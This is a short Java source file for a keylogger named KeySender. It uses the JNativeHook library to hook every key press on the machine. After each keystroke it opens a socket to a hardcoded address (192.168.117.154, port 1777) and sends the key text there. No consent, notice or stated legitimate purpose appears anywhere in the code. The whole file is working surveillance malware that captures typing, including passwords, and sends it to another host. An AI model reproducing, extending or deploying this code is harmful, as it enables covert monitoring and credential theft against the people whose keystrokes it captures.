import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;

import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author msalik42
 */
class KeySender implements NativeKeyListener {
    static {
    //NativeLibsLoaderUtil.addLibsToJavaLibraryPath("jnativehook-2.1.0.jar");
    }

    public static String keys = " ";

    public static void main(String[] args) throws IOException {

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new KeySender());

        

    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nke) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        System.out.println(NativeKeyEvent.getKeyText(e.getKeyCode()));
        String st = NativeKeyEvent.getKeyText(e.getKeyCode());
        if (st.equals("Space")  || st.equals("Backspace") || st.equals("Tab") || st.equals("Ctrl") || st.equals("Alt")){
            st = " ";
        }
        keys = "\n"+st;
        System.out.println(keys);
        
        try {
            new Sender().sendmsg();
        } catch (IOException ex) {
            Logger.getLogger(KeySender.class.getName()).log(Level.SEVERE, null, ex);
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nke) {
    }

    public static class Sender extends Thread {

        public void sendmsg() throws IOException {
            Socket socket1;
            int portNumber = 1777;
            String str = keys;

            socket1 = new Socket(InetAddress.getByName("192.168.117.154"), portNumber);

            BufferedReader br = new BufferedReader(new InputStreamReader(socket1.getInputStream()));

            PrintWriter pw = new PrintWriter(socket1.getOutputStream(), true);

            pw.println(str);

            while ((str = br.readLine()) != null) {
                System.out.println(str);
                pw.println("bye");

                if (str.equals("bye")) {
                    break;
                }
            }

            br.close();
            pw.close();
            socket1.close();
        }
    }

}
